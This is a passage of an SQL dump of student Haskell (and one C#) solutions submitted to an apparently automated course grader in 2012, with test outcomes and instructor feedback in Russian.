                  str = str.Substring(3).Trim();\r\n\r\n                            SplitArgs(str, out str1, out str2);\r\n\r\n                            arg1 = new Expr(str1);\r\n\r\n                            arg2 = new Expr(str2);\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                        {\r\n\r\n                            throw new ArgumentException(str);\r\n\r\n                        }\r\n\r\n                        break;\r\n\r\n                    case ''M'':\r\n\r\n                        if (str[1] == ''u'' && str[2] == ''l'' && str[3] == ''t'')\r\n\r\n                        {\r\n\r\n                            type = exprTypes.Mult;\r\n\r\n                            str = str.Substring(4).Trim();\r\n\r\n                            SplitArgs(str, out str1, out str2);\r\n\r\n                            arg1 = new Expr(str1);\r\n\r\n                            arg2 = new Expr(str2);\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                        {\r\n\r\n                            throw new ArgumentException(str);\r\n\r\n                        }\r\n\r\n                        break;\r\n\r\n                    default:\r\n\r\n                        throw new ArgumentException(str);\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n\r\n\r\n        #region Public methods\r\n\r\n        public Expr Diff()\r\n\r\n        {\r\n\r\n            Expr arg1Diff, arg2Diff;\r\n\r\n\r\n\r\n            switch (type)\r\n\r\n            {\r\n\r\n                case exprTypes.X:\r\n\r\n                    return new Expr(exprTypes.N, 1);\r\n\r\n                case exprTypes.N:\r\n\r\n                    return new Expr(exprTypes.N, 0);\r\n\r\n                case exprTypes.Add:\r\n\r\n                    return new Expr(exprTypes.Add, arg1.Diff(), arg2.Diff());\r\n\r\n                case exprTypes.Mult:\r\n\r\n                    arg1Diff = arg1.Diff();\r\n\r\n                    arg2Diff = arg2.Diff();\r\n\r\n                    return new Expr(exprTypes.Add, new Expr(exprTypes.Mult, arg1Diff, arg2), new Expr(exprTypes.Mult, arg1, arg2Diff));\r\n\r\n                default:\r\n\r\n                    throw new ArgumentException();\r\n\r\n            }\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n\r\n\r\n        #region Public overrided methods\r\n\r\n        public override string ToString()\r\n\r\n        {\r\n\r\n            switch (type)\r\n\r\n            {\r\n\r\n                case exprTypes.X:\r\n\r\n                    return "X";\r\n\r\n                case exprTypes.N:\r\n\r\n                    return String.Format("N {0}", n);\r\n\r\n                case exprTypes.Add:\r\n\r\n                    bool arg1Flag = arg1.type == exprTypes.X;\r\n\r\n                    bool arg2Flag = arg2.type == exprTypes.X;\r\n\r\n                    return String.Format("Add {0}{1}{2} {3}{4}{5}", arg1Flag ? "" : "(", arg1, arg1Flag ? "" : ")",\r\n\r\n                                                                    arg2Flag ? "" : "(", arg2, arg2Flag ? "" : ")");\r\n\r\n                case exprTypes.Mult:\r\n\r\n                    arg1Flag = arg1.type == exprTypes.X;\r\n\r\n                    arg2Flag = arg2.type == exprTypes.X;\r\n\r\n                    return String.Format("Mult {0}{1}{2} {3}{4}{5}", arg1Flag ? "" : "(", arg1, arg1Flag ? "" : ")",\r\n\r\n                                                                    arg2Flag ? "" : "(", arg2, arg2Flag ? "" : ")");\r\n\r\n                default:\r\n\r\n                    throw new ArgumentException();\r\n\r\n            }\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n\r\n\r\n        #region Private static methods\r\n\r\n        private static string RemoveOuterBraces(string str)\r\n\r\n        {\r\n\r\n            if (str[0] == ''('')\r\n\r\n            {\r\n\r\n                return str.Substring(1, str.Length - 2);\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                return str;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        private static void SplitArgs(string str, out string arg1, out string arg2)\r\n\r\n        {\r\n\r\n            int pos;\r\n\r\n\r\n\r\n            if (str[0] != ''('')\r\n\r\n            {\r\n\r\n                if (str[0] == ''X'')\r\n\r\n                {\r\n\r\n                    arg1 = "X";\r\n\r\n                    arg2 = RemoveOuterBraces(str.Substring(1).Trim());\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    throw new ArgumentException(str);\r\n\r\n                }\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                pos = 1;\r\n\r\n                uint n = 1;\r\n\r\n                while (pos < str.Length && n != 0)\r\n\r\n                {\r\n\r\n                    if (str[pos] == ''('')\r\n\r\n                    {\r\n\r\n                        n++;\r\n\r\n                    }\r\n\r\n                    else if (str[pos] == '')'')\r\n\r\n                    {\r\n\r\n                        n--;\r\n\r\n                    }\r\n\r\n                    pos++;\r\n\r\n                }\r\n\r\n                arg1 = str.Substring(1, pos - 2).Trim();\r\n\r\n                string tmp = str.Substring(pos).Trim();\r\n\r\n                arg2 = RemoveOuterBraces(tmp);\r\n\r\n            }\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3536, 90, '532002', '2012-11-14 17:42:10', 1, 'import Data.List (sort)\r\n\r\nfindSame xs = findSame1 (sort xs) where\r\n\r\nfindSame1 (x:y:ys) = if (x==y) then (True,x) else findSame1(y:ys)\r\n\r\nfindSame1 (x:ys) = (False,(-1))\r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(3537, 85, '3742311', '2012-11-14 17:46:05', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Num Ration where\r\n  (Rat a b) + (Rat c d) = Rat (a * d + b * c) (b * d)\r\n\r\ninstance Eq Ration where\r\n  (Rat a b) == (Rat c d) = a * d == b * c\r\n\r\ninstance Ord Ration where\r\n  (Rat a b) < (Rat c d) = if b > 0 && d > 0 || b < 0 && d < 0  then a * d < b * c else a * d > b * c\r\n\r\ninstance Show Ration where\r\n  show (Rat a b) = (show a) ++ (''/'':(show b))', '<br/>Тесты успешно пройдены!'),
(3538, 86, '532002', '2012-11-14 18:01:49', 1, 'allNondivisible xs = allNondivisible1 xs (	->True) where\r\n\r\nallNondivisible1 (x:xs) f = if(f x) then allNondivisible1 xs (	 -> (f t) && (mod t x /= 0) && (mod x t /= 0)) else False\r\n\r\nallNondivisible1 [] _ = True\r\n', '<br/>Тесты успешно пройдены!'),
(3539, 85, '63706456', '2012-11-14 18:04:02', 0, 'data Rat = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Eq Rat where\r\n	Rat a b == Rat c d = a*d == b*c\r\n\r\ninstance Ord Rat where\r\n	Rat a b < Rat c d = a*d < b*c\r\n\r\ninstance Num Rat where\r\n	Rat a b + Rat c d = Rat (a*d + b*c) (b*d)\r\n\r\ninstance Show Rat where\r\n	show (Rat a b) = show a ++ "/" ++ show b', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3540, 86, '3742311', '2012-11-14 18:04:52', 2, 'allNondivisible [] = True\r\nallNondivisible (h:t) = if (any (x -> (mod x h) == 0 || (mod h x) == 0) t) then False else allNondivisible t\r\n  --- Тут такая проблема - у вас решение в принципе совершенно правильное, но не по условию (нет этого\r\n  --- приема, который мы проходили). И в то же время вы прислали ее слишком поздно, чтобы я успел\r\n  --- что-то подсказать, как обещал.\r\n  --- Мок предолжение такое - я пока ее не засчитаю, но, если вы сделаете задачу 27-1 (с этим же приемом)\r\n  --- то пришлите снова и  22-2 (с приемом или без приема, все равно и я ее тоже засчитаю)', '<br/>Тесты успешно пройдены!'),
(3541, 85, '63706456', '2012-11-14 18:10:04', 0, 'data Rat = Rat Integer Integer\r\n\r\ninstance Eq Rat where\r\n	Rat a b == Rat c d = a*d == b*c\r\n\r\ninstance Ord Rat where\r\n	Rat a b < Rat c d = (a/b > c/d)\r\n\r\ninstance Num Rat where\r\n	Rat a b + Rat c d = Rat (a*d + b*c) (b*d)\r\n\r\ninstance Show Rat where\r\n	show (Rat a b) = show a ++ "/" ++ show b', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3542, 89, '532002', '2012-11-14 18:10:29', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree (f) h Empty  = h\r\n\r\nfoldTree (f) h (Node n l r) = n `f` (foldTree f (foldTree f h r) l)\r\n\r\nflatten t = foldTree (:) [] t\r\n', '<br/>Тесты успешно пройдены!'),
(3543, 85, '63706456', '2012-11-14 18:11:31', 2, 'data Rat = Rat Integer Integer\r\n\r\ninstance Eq Rat where\r\n	Rat a b == Rat c d = a*d == b*c\r\n\r\ninstance Ord Rat where\r\n	Rat a b < Rat c d = (a/b > c/d)\r\n   --- Тут Хаскел не понимает, что вы хотите работать с вещественными числами\r\n   --- Самое простое, мне кажется, преобразовать это сравнение, чтобы все вычисления были целочисленными,\r\n   --- это же не очень сложно\r\n   --- Я вам поставлю незчатено, но если не придумаете другого рещения, просто пришлите это еще раз и я его зачту\r\n\r\ninstance Num Rat where\r\n	Rat a b + Rat c d = Rat (a*d + b*c) (b*d)\r\n\r\ninstance Show Rat where\r\n	show (Rat a b) = show a ++ "/" ++ show b', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3544, 90, '63706456', '2012-11-14 18:22:43', 1, 'findSame [] = []\r\nfindSame (x:xs) | x `elem` xs = x: (findSame (filter (/= x) xs))\r\n		| otherwise = findSame xs', '<br/>Тесты успешно пройдены!'),
(3545, 82, '51559263', '2012-11-14 18:32:39', 1, ' --- ОК, замечательно!\r\n--- Решение №1 - просто доведённое до конца старое (появилась функция "equalVars", используется она при построении "basePairs") ---\r\n\r\n\r\n\r\nallPairs [] = []\r\n\r\n\r\n\r\nallPairs (x : xs) = zip ( map (  _ -> x ) xs ) xs ++ ( allPairs xs )\r\n\r\n\r\n\r\nequalVars a ps = let \r\n\r\n                    lst = foldr (  (c,d) ys -> if c == a\r\n\r\n                                                then d : ys\r\n\r\n                                                else if d == a\r\n\r\n                                                     then c : ys\r\n\r\n                                                     else ys )\r\n\r\n                                []\r\n\r\n                                ps\r\n\r\n                 in\r\n\r\n                    foldr (  x xs -> equalVars x (filter (  p -> (fst p /= a) && (snd p /= a) ) ps) ++ xs )\r\n\r\n                          lst\r\n\r\n                          lst\r\n\r\n\r\n\r\nbasePairs xs = foldr \r\n\r\n                    (  (x,y) ys -> let \r\n\r\n                                       lst = foldr (  (a,b) ps -> a : b : ps ) [] ys\r\n\r\n                                    in  \r\n\r\n                                       if ( (elem x lst) && (elem y lst) && (elem y (equalVars x ys)) ) \r\n\r\n                                       then ys\r\n\r\n                                       else (x,y) : ys ) \r\n\r\n                    [] \r\n\r\n                    xs\r\n\r\n\r\n\r\nfullEqualSystem xs = foldr \r\n\r\n                          (  (x,y) ys -> (foldr \r\n\r\n                                                (  (a,b) ps -> if a == x\r\n\r\n                                                                then (b,y) : (y,b) : ps\r\n\r\n                                                                else if a == y\r\n\r\n                                                                     then (b,x) : (x,b) : ps\r\n\r\n                                                                     else ps ) \r\n\r\n                                                [(x,y),(y,x)] \r\n\r\n                                                ys) ++ ys ) \r\n\r\n                          [] \r\n\r\n                          xs\r\n\r\n\r\n\r\nallDifferent xs = foldr (  x ys -> x : filter (/=x) ys ) [] xs\r\n\r\n\r\n\r\nintersect xs ys = filter (  x -> elem x xs ) ys\r\n\r\n\r\n\r\ncountDifferentVars xs ys = let \r\n\r\n                               diffs = allDifferent ys\r\n\r\n                           in \r\n\r\n                               length diffs - length ( basePairs ( intersect (allPairs diffs) (fullEqualSystem xs) ) )\r\n\r\n\r\n\r\n\r\n\r\n--- Решение №2 с использованием только equalVars и allDifferent ---\r\n\r\n\r\n\r\n\r\n\r\nqSort [] = []\r\n\r\n\r\n\r\nqSort ( x : xs ) = qSort [ t | t <- xs, t <= x ] ++ [x] ++ qSort [ t | t <- xs, t > x ]\r\n\r\n\r\n\r\n\r\n\r\ncDV xs ys = length ( allDifferent ( map (  x -> qSort (x : allDifferent ( equalVars x xs )) ) ys ) )\r\n', '<br/>Тесты успешно пройдены!'),
(3546, 86, '63706456', '2012-11-14 18:41:49', 1, 'divides x n = mod x n == 0\r\n\r\nallNondivisible ls = allAcc (x -> False) ls\r\nallAcc p [] = True\r\nallAcc p (x:xs) | p x = False\r\n		| otherwise = allAcc (y -> divides y x || divides x y || p y) xs', '<br/>Тесты успешно пройдены!'),
(3547, 89, '63706456', '2012-11-14 18:50:37', 1, '  --- Замечательно, хорошая идея!\r\ndata Tree a = Node a (Tree a) (Tree a) | Empty deriving Show\r\n\r\nfoldTree f def (Node num left right) = 	f num (recCall left) (recCall right)\r\n					where recCall = foldTree f def\r\nfoldTree f def Empty = def\r\n\r\nfoldTree'' f = foldTree (x y z -> (f x) . y . z) id\r\n\r\nflatten tree = (foldTree'' (x -> (x:)) tree) []', '<br/>Тесты успешно пройдены!'),
(3548, 87, '383483', '2012-11-14 18:57:46', 1, 'data Expr = X| N Integer| Add Expr Expr| Mult Expr Expr deriving Show\r\neval X a = a\r\neval (N n) a = n\r\neval (Add a b) c = (eval a c) + (eval b c)\r\neval (Mult a b) c = (eval a c) * (eval b c)\r\n', '<br/>Тесты успешно пройдены!'),
(3549, 87, '63706456', '2012-11-14 18:59:32', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X n = n\r\neval (N n) _ = n\r\neval (Add e1 e2) n = (eval e1 n) + (eval e2 n)\r\neval (Mult e1 e2) n = (eval e1 n) * (eval e2 n)', '<br/>Тесты успешно пройдены!'),
(3550, 85, '51559263', '2012-11-14 19:00:07', 0, 'data Rat = Rat Integer Integer\r\n\n\r\n\ninstance Eq Rat where\r\n\n   (Rat a b) == (Rat c d) = (a*d) == (b*c)\r\n\n\r\n\ninstance Ord Rat where\r\n\n   (Rat a b) < (Rat c d) = (a*d) < (b*c)\r\n\n\r\n\ninstance Num Rat where\r\n\n   (Rat a b) + (Rat c d) = Rat (a*d + b*c) (b*d)\r\n\n\r\n\ninstance Show Rat where\r\n\n   show (Rat a b) = show a ++ "/" ++ show b\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3551, 88, '63706456', '2012-11-14 19:04:25', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = (N 1)\r\ndiff (N _) = (N 0)\r\ndiff (Mult e1 e2) = (Add (Mult (diff e1) e2) (Mult e1 (diff e2)))\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)', '<br/>Тесты успешно пройдены!'),
(3552, 88, '383483', '2012-11-14 19:08:05', 1, 'data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\ndiff X = N 1\r\ndiff (N a) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3553, 85, '51559263', '2012-11-14 19:14:00', 1, 'data Rat = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Eq Rat where\r\n\r\n   (Rat a b) == (Rat c d) = (a*d) == (b*c)\r\n\r\n\r\n\r\ninstance Ord Rat where\r\n\r\n   (Rat a b) < (Rat c d) = if (a*b >= 0 && c*d >= 0) \r\n\r\n                           then (a*d) < (b*c)\r\n\r\n                           else if (a*b < 0 && c*d >= 0)\r\n\r\n                                then True\r\n\r\n								else if (a*b >= 0 && c*d < 0)\r\n\r\n								     then False\r\n\r\n								     else abs(a*d) > abs(b*c)\r\n\r\n\r\n\r\ninstance Num Rat where\r\n\r\n   (Rat a b) + (Rat c d) = Rat (a*d + b*c) (b*d)\r\n\r\n\r\n\r\ninstance Show Rat where\r\n\r\n   show (Rat a b) = show a ++ "/" ++ show b\r\n', '<br/>Тесты успешно пройдены!'),
(3554, 91, '532002', '2012-11-14 19:15:47', 1, 'merge (x:xs) (y:ys) = if x>y then y:(merge (x:xs) ys) else if (x<y) then x:(merge xs (y:ys)) else x:(merge xs ys)\r\n\r\nmerge [] ys = ys\r\n\r\nmerge xs [] = xs\r\n\r\nmerge [] [] = []\r\n', '<br/>Тесты успешно пройдены!'),
(3555, 86, '419046', '2012-11-14 20:13:51', 0, 'allNondivisible xs = allNondivisible'' xs (	 -> True)\n\n\r\n\nallNondivisible'' [] _ = True\r\n\n\n\nallNondivisible'' (x:xs) cond = if not (cond x)\n\n\r\n\n                            then False\n\n\r\n\n                            else allNondivisible'' xs (	 -> cond t && (mod t x /=0))\n\n\n', 'Выражение имеет неправильное значение: allNondivisible [4,2]'),
(3556, 86, '419046', '2012-11-14 20:19:47', 1, 'allNondivisible xs = allNondivisible'' xs (	 -> True)\r\n\r\n\r\n\r\nallNondivisible'' [] _ = True\r\n\r\n\r\n\r\nallNondivisible'' (x:xs) cond = if not (cond x)\r\n\r\n\r\n\r\n                            then False\r\n\r\n\r\n\r\n                            else allNondivisible'' xs (	 -> cond t && (mod t x /=0) && (mod x t /=0))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3557, 86, '51559263', '2012-11-14 20:33:17', 1, 'aN [] _ = True\r\n\r\n\r\n\r\naN ( x : xs ) cond = if not (cond x)\r\n\r\n                     then False\r\n\r\n					 else aN xs (  t -> cond t && mod t x /= 0 && mod x t /= 0 )\r\n\r\n					 \r\n\r\nallNondivisible xs = aN xs (  t -> True )\r\n', '<br/>Тесты успешно пройдены!'),
(3558, 87, '51559263', '2012-11-14 20:49:34', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\neval X n = n\r\n\r\n\r\n\r\neval (N n) _ = n\r\n\r\n\r\n\r\neval (Add e1 e2) n = (eval e1 n) + (eval e2 n)\r\n\r\n\r\n\r\neval (Mult e1 e2) n = (eval e1 n) * (eval e2 n)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3559, 86, '5772638', '2012-11-14 20:51:35', 0, 'elem x (y:ys) = if ((mod x y==0)|| (mod y x==0)) then True else elem x ys\r\nelem x []= False\r\n\r\nallNondivisible xs =allNondivisible'' xs []\r\n\r\nallNondivisible'' (x:xs) set =  if elem x set then False else allNondivisible'' xs (x:set)\r\nallNondivisible''  [] _ = True', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3560, 91, '5477377', '2012-11-14 21:09:43', 1, 'merge [] x = x\r\nmerge x [] = x\r\n\r\nmerge (x:xs) (y:ys) = \r\n    if x < y then\r\n        x:(merge xs (y:ys))\r\n    else\r\n        if x == y then\r\n            x:(merge xs ys)\r\n        else\r\n            y:(merge (x:xs) ys)    \r\n      ', '<br/>Тесты успешно пройдены!'),
(3561, 88, '51559263', '2012-11-14 21:09:57', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\n\r\n\ndiff X = N 1\r\n\n\r\n\ndiff (N _) = N 0\r\n\n\r\n\ndiff ( Add e1 e2 ) = Add (diff e1) (diff e2)\r\n\n\r\n\ndiff ( Mult e1 e2 ) = Add ( Mult (diff e1) e2 ) ( Mult (diff e2) e1 )\n', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3562, 88, '51559263', '2012-11-14 21:11:09', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\ndiff X = N 1\r\n\r\n\r\n\r\ndiff (N _) = N 0\r\n\r\n\r\n\r\ndiff ( Add e1 e2 ) = Add (diff e1) (diff e2)\r\n\r\n\r\n\r\ndiff ( Mult e1 e2 ) = Add ( Mult (diff e1) e2 ) ( Mult e1 (diff e2) )\r\n', '<br/>Тесты успешно пройдены!'),
(3563, 85, '63706456', '2012-11-14 21:23:17', 1, 'data Rat = Rat Integer Integer\r\n\r\ninstance Eq Rat where\r\n	Rat a b == Rat c d = a*d == b*c\r\n\r\ninstance Ord Rat where\r\n	Rat a b < Rat c d = if d * b > 0 then comp else (not comp)\r\n                          where comp = a*c < b*d\r\n\r\n--странно, я удивился почему это сработало и отправил\r\n   --- А что странно, Андрей, я не очень понял?\r\n\r\ninstance Num Rat where\r\n	Rat a b + Rat c d = Rat (a*d + b*c) (b*d)\r\n\r\ninstance Show Rat where\r\n	show (Rat a b) = show a ++ "/" ++ show b', '<br/>Тесты успешно пройдены!'),
(3564, 86, '5772638', '2012-11-14 21:25:05', 0, 'elas x (y:ys) = if( (mod x y==0)||(mod  y x==0)) then True else elas x ys\r\nelas x []=False\r\nalln xs = alln'' xs []\r\nalln'' (x:xs) set = if elas x set then False else alln'' xs (x:set)\r\nalln'' [] _=True', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3565, 86, '5772638', '2012-11-14 21:26:24', 1, 'elas x (y:ys) = if( (mod x y==0)||(mod  y x==0)) then True else elas x ys\r\nelas x []=False\r\nallNondivisible xs = alln'' xs []\r\nalln'' (x:xs) set = if elas x set then False else alln'' xs (x:set)\r\nalln'' [] _=True\r\nallNondivisible []      = True\r\nallNondivisible (hd:tl) = (all (x -> mod x hd /= 0 && mod hd x /= 0) tl)&&(allNondivisible tl)  \r\n  --- Тут у вас (и у меня:) такая проблема - \r\n  --- у вас решение в принципе совершенно правильное, но не по условию (нет этого\r\n  --- приема "множество как функция", который мы проходили). И в то же время вы прислали ее \r\n  --- слишком поздно, чтобы я успел что-то подсказать, как обещал.\r\n  --- Мое предложение такое - я пока ее не засчитаю, но, если вы сделаете задачу 27-1 (с этим же приемом)\r\n  --- то пришлите снова и  22-2 (с приемом или без приема, все равно и я ее тоже засчитаю)\r\n  --- Про прием мы говорили и на последнем и на предпоследнем занятии, и, если вы посмотрите\r\n  --- примеры, то без труда все сделаете, я думаю. Но, если будут вопросы, пишите.', '<br/>Тесты успешно пройдены!'),
(3566, 91, '985727', '2012-11-14 21:27:28', 1, 'merge [] [] = []\r\n   --- Это правило особо не нужно, оно следует из остальных \r\nmerge xs [] = xs\r\nmerge [] xs = xs\r\n\r\nmerge xs ys = if(xs!!0 > ys!!0) then (ys!!0):(merge xs (tail ys)) else (if (xs!!0 == ys!!0) then (ys!!0):(merge (tail xs) (tail ys)) else (xs!!0):(merge ys (tail xs)))', '<br/>Тесты успешно пройдены!'),
(3567, 97, '4169333', '2012-11-14 21:27:36', 1, 'checkBrackets xs=  let \r\n		     n= div ((div (length xs) 2)*((div (length xs) 2)+1)) 2 \r\n		   in check1 xs n []\r\ncheck1 (x:[]) _ _ = False\r\ncheck1 [] _ _= True\r\n\r\ncheck1 (x:y:xs) n a  = if ((x==''('' && y=='')'') || (x==''['' && y=='']''))\r\n		       then check1 (a++xs) (n-1) []\r\n                       else check1 (y:xs) (n-1) (a++[x])\r\n  --- А где же вы используете это ваше n? Мне кажется, нигде?\r\n  --- ОК, в любом случае решение правильое, но, на самом деле есть и гораздо более эффективное\r\n  --- Мы его разберем, но, могу подсказать - можно заметить, что ваш параметр\r\n  --- должен состоять только из открывающих скобок\r\n  --- Если туда попала закрывающая, то последоватальность точно неправильная\r\n  --- И второе, в сокращении у вас, на самом деле, всегда будет участвовать _последняя_\r\n  --- открывающая скобка из\r\n  --- \r\n-- Почему n равно именно этому числу? если рассмотреть большую "правильную вложенность"(мне показалось, что именно это\r\n-- самый худший случай по отношению к числу проходов), например ((((())))), то первый раз мы найдем "()"за 5 шагов, второй раз \r\n-- за 4 шага и т.д, то есть 5+4+3+2+1=15 = 5*6/2 = ((половина длины строки) * (половина длины строки +1))/2.\r\n-- в "а" хранится то, что прошли. если нашли пару, то её убираем и припивываем в начало "а", потом идем заново по строке.', '<br/>Тесты успешно пройдены!'),
(3568, 90, '5477377', '2012-11-14 21:30:08', 1, 'isExists x [] = False\r\nisExists x xs = \r\n    if x == head xs then\r\n        True\r\n    else\r\n        isExists x (tail xs)\r\n --- Просто как замечание, есть аналогичная стандартная функция elem, можно было ей воспользовться\r\n\r\nfindSame [x] = (0, "alone")\r\n\r\nfindSame (x:xs) =\r\n    if isExists x xs then\r\n        (x, "couple")\r\n    else\r\n        findSame xs', '<br/>Тесты успешно пройдены!'),
(3569, 85, '5772638', '2012-11-14 21:41:26', 0, 'data Rat = R Int Int\r\ninstance Num Rat where (R a1 b1)+(R a2 b2)=R (a1*b2+ a2*b1) (b1*b2)\r\ninstance Eq Rat where R a1 b1== R a2 b2 = a1==a2&&b1==b2\r\ninstance Show Rat where show( R a b)= show a++"/"++ show b\r\ninstance Ord Rat where (R a1 b1)<(R a2 b2)= a1*b2<a2*b1', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3570, 89, '985727', '2012-11-14 21:41:42', 0, 'flatten Empty = []\r\nflatten (Node x y z) = x:(flatten y) ++ (flatten z)', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3571, 89, '985727', '2012-11-14 21:42:35', 0, 'flatten Empty = []\r\nflatten (Node x y z) = x:(flatten y) ++ (flatten z)', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3572, 85, '5772638', '2012-11-14 21:43:09', 1, 'data Rat = Rat Int Int\r\ninstance Num Rat where (Rat a1 b1)+(Rat a2 b2)=Rat (a1*b2+ a2*b1) (b1*b2)\r\ninstance Eq Rat where Rat a1 b1== Rat a2 b2 = a1==a2&&b1==b2\r\ninstance Show Rat where show( Rat a b)= show a++"/"++ show b\r\ninstance Ord Rat where (Rat a1 b1)<(Rat a2 b2)= a1*b2<a2*b1', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3573, 89, '985727', '2012-11-14 21:44:28', 0, 'flatten Empty = []\r\nflatten (Node x y z) = x:(flatten y)++(flatten z)', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса'),
(3574, 89, '985727', '2012-11-14 21:45:22', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nflatten Empty = []\r\nflatten (Node x y z) = x:(flatten y)++(flatten z)', '<br/>Тесты успешно пройдены!'),
(3575, 89, '5477377', '2012-11-14 21:48:29', 1, 'data BinaryTree a = Empty| Node a (BinaryTree a) (BinaryTree a)\r\n\r\nflatten1 Empty xs = xs\r\nflatten1 (Node a left right) xs = a: flatten1 left (flatten1 right xs)\r\n\r\nflatten Empty = []\r\nflatten a = flatten1 a []', '<br/>Тесты успешно пройдены!'),
(3576, 86, '5477377', '2012-11-14 22:03:05', 1, 'allNdiv [] cond = True\r\nallNdiv (x:xs) cond = \r\n    if not (cond x) then\r\n        False\r\n    else\r\n        allNdiv xs (	 -> cond t && mod t x /= 0 && mod x t /= 0)\r\n\r\nallNondivisible x =allNdiv x (	 -> True)', '<br/>Тесты успешно пройдены!'),
(3577, 90, '985727', '2012-11-14 22:08:42', 1, 'find x [] = (0,False)\r\nfind x xs = if (x == xs!!0) then (x,True) else (find x (tail xs))\r\n   --- Тут, на самом деле особо не зачем возвращать (x,True).\r\n   --- Достаточно просто True (x мы и так знаем, мы же его ищем)\r\nf (x,y) = y\r\nfindSame [] = (0,False)\r\nfindSame xs = if(f (find (xs!!0) (tail xs))) then (find (xs!!0) (tail xs)) else (findSame (tail xs))', '<br/>Тесты успешно пройдены!'),
(3578, 87, '5477377', '2012-11-14 22:09:40', 1, 'data Expr = N Integer| X | Add Expr Expr| Mult Expr Expr\r\n\r\neval (N a) x = a\r\neval X x = x\r\neval (Add a b) x = (eval a x) + (eval b x)\r\neval (Mult a b) x = (eval a x) * (eval b x)', '<br/>Тесты успешно пройдены!'),
(3579, 90, '5772638', '2012-11-14 22:10:00', 1, 'findSame xs=findSame'' xs []\r\nfindSame'' (x:xs) ys= if  elem x ys then ([x],True) else findSame'' xs (x:ys)\r\nfindSame'' [] _ = ([],False)\r\n   --- ОК, но, просто как замечание, тут уже True/False возвращать особо ни к чему.\r\n   --- Мы и так знаем, нашли мы что-то мили не нашли (по тому, пустой у нас список, или не пустой) ', '<br/>Тесты успешно пройдены!'),
(3580, 88, '5477377', '2012-11-14 22:14:26', 1, 'data Expr = N Integer| X | Add Expr Expr| Mult Expr Expr deriving Show\r\n\r\ndiff (N a) = N 0\r\ndiff X = N 1\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))', '<br/>Тесты успешно пройдены!'),
(3581, 86, '374969', '2012-11-14 22:31:43', 0, 'allNondivisible []      = True\r\nallNondivisible (hd:tl) = (any (x -> mod x hd == 0 || mod hd x == 0) tl)&&(allNondivisible tl)  ', 'Выражение имеет неправильное значение: allNondivisible [4, 7, 6, 5]'),
(3582, 86, '374969', '2012-11-14 22:35:33', 0, 'allNondivisible []      = True\r\nallNondivisible (hd:tl) = (all (x -> not(mod x hd == 0 && mod hd x == 0)) tl)&&(allNondivisible tl)  ', 'Выражение имеет неправильное значение: allNondivisible [2, 7, 6, 5]'),
